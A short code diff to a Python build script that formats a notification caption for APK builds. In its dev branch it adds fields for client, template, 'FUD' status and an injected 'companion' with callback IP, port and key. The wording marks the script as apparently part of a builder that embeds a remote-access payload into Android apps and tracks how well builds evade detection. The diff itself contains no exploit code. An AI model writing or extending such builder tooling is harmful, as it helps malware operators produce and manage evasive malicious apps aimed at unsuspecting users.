@@ -692,8 +692,21 @@ def main():
         built_at = _dt.datetime.utcnow().strftime("%d %b %Y, %-I:%M %p") + " UTC"
 
         if is_dev:
+            _app_name     = args.app_name or display_name
+            _template_lbl = display_name
+            _key_lbl      = args.server_key or "—"
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
+                f"Client   : [DEV TEST]\n"
+                f"App      : {_app_name}\n"
+                f"Template : {_template_lbl}\n"
+                f"FUD      : OFF 🔴\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"🌐 Companion injected:\n"
+                f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
+                f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
+                f"Key      : <code>{_key_lbl}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"Package  : <code>{args.pkg}</code>\n"
                 f"Size     : {args.apk_size}"
             )
